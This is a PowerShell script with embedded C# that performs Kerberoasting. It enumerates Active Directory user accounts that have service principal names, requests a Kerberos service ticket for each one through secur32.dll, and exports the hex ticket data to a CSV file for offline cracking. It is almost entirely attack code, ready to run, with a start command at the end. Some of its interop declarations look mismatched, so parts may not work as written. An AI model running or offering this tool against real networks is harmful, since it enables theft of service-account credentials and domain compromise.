Add-Type @"
using System;
using System.Runtime.InteropServices;

public class K {
    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int AcquireCredentialsHandle(
        string pszPrincipal,
        string pszPackage,
        uint fCredentialUse,
        IntPtr pvLogonID,
        IntPtr pAuthData,
        IntPtr pGetKeyFn,
        IntPtr pvGetKeyArgument,
        out IntPtr phCredential,
        out IntPtr ptsExpiry);

    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int InitializeSecurityContext(
        IntPtr phCredential,
        IntPtr phContext,
        string pszTargetName,
        uint fContextReq,
        uint Reserved1,
        uint TargetDataRep,
        IntPtr pInput,
        uint Reserved2,
        out IntPtr phNewContext,
        out SecBufferDesc pOutput,
        out uint pfContextAttr,
        out IntPtr ptsExpiry);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int FreeCredentialsHandle(IntPtr phCredential);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int FreeContextBuffer(IntPtr pvContextBuffer);

    [StructLayout(LayoutKind.Sequential)]
    public struct SecBuffer {
        public uint cbBuffer;
        public uint BufferType;
        public IntPtr pvBuffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SecBufferDesc {
        public uint ulVersion;
        public uint cBuffers;
        public IntPtr pBuffers;
    }

    public static string GetTicket(string spn) {
        IntPtr cred = IntPtr.Zero;
        IntPtr ctx = IntPtr.Zero;
        IntPtr expiry1 = IntPtr.Zero;
        IntPtr expiry2 = IntPtr.Zero;
        IntPtr bufPtr = IntPtr.Zero;
        uint attr = 0;

        SecBuffer secBuf = new SecBuffer();
        secBuf.BufferType = 2;
        secBuf.cbBuffer = 0;
        secBuf.pvBuffer = IntPtr.Zero;

        try {
            bufPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SecBuffer)));
            Marshal.StructureToPtr(secBuf, bufPtr, false);

            SecBufferDesc desc = new SecBufferDesc();
            desc.ulVersion = 0;
            desc.cBuffers = 1;
            desc.pBuffers = bufPtr;

            if (AcquireCredentialsHandle(
                    null,
                    "Kerberos",
                    0x00000002,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    out cred,
                    out expiry1) != 0)
                return "";

            if (InitializeSecurityContext(
                    cred,
                    IntPtr.Zero,
                    spn,
                    0x00001000,
                    0,
                    16,
                    IntPtr.Zero,
                    0,
                    out ctx,
                    out desc,
                    out attr,
                    out expiry2) != 0)
                return "";

            SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(desc.pBuffers, typeof(SecBuffer));
            if (resultBuf.cbBuffer == 0 || resultBuf.pvBuffer == IntPtr.Zero)
                return "";

            byte[] data = new byte[resultBuf.cbBuffer];
            Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
            return BitConverter.ToString(data).Replace("-", "");
        } finally {
            if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
            if (bufPtr != IntPtr.Zero) {
                try {
                    SecBuffer cleanup = (SecBuffer)Marshal.PtrToStructure(bufPtr, typeof(SecBuffer));
                    if (cleanup.pvBuffer != IntPtr.Zero) FreeContextBuffer(cleanup.pvBuffer);
                } catch { }
                Marshal.FreeHGlobal(bufPtr);
            }
        }
    }
}
"@

function Get-AdServiceAccountsV2 {
    Param (
        [string] $Domain,
        [int] $PageSize = 200
    )

    $dnsDomain = if ($Domain) { $Domain } else { $env:USERDNSDOMAIN }
    if (-not $dnsDomain) { throw "Could not resolve DNS domain. Provide -Domain." }

    $baseDn = "DC=$($dnsDomain -replace '\.',',DC=')"
    $ldapPath = "LDAP://$baseDn"
    $de = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)
    $ds.PageSize = $PageSize
    $ds.SearchScope = "Subtree"
    $ds.CacheResults = $false
    $ds.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*))"
    $props = @('sAMAccountName','servicePrincipalName','distinguishedName')
    foreach ($p in $props) { [void]$ds.PropertiesToLoad.Add($p) }

    try {
        $results = $ds.FindAll()
    } catch {
        Write-Error "LDAP search failed: $_"
        return
    }

    foreach ($r in $results) {
        $z = $r.Properties
        $spns = $z['serviceprincipalname']
        if ($spns) {
            foreach ($spn in $spns) {
                [PSCustomObject]@{
                    SamAccountName       = $z['samaccountname'][0]
                    DistinguishedName    = $z['distinguishedname'][0]
                    SPN                  = $spn
                }
            }
        }
    }

    $ds.Dispose()
    $de.Dispose()
}

function Get-KerberosTicketsForAllSPNs {
    Param (
        [switch] $ExportToCsv
    )

    $results = Get-AdServiceAccountsV2
    $tickets = @()

    foreach ($r in $results) {
        Write-Host "`nRequesting TGS for SPN: $($r.SPN)"
        try {
            $ticket = [K]::GetTicket($r.SPN)
            $obj = [PSCustomObject]@{
                Account = $r.SamAccountName
                SPN     = $r.SPN
                Ticket  = $ticket
            }
            $tickets += $obj
        } catch {
            Write-Warning "Failed to get ticket for SPN $($r.SPN): $_"
        }
    }

    if ($ExportToCsv) {
        $tickets | Export-Csv "KerberosTickets.csv" -NoTypeInformation -Encoding UTF8
        Write-Host "`nTickets exported to KerberosTickets.csv"
    } else {
        $tickets
    }
}

# Run this to start:
# Get-KerberosTicketsForAllSPNs -ExportToCsv
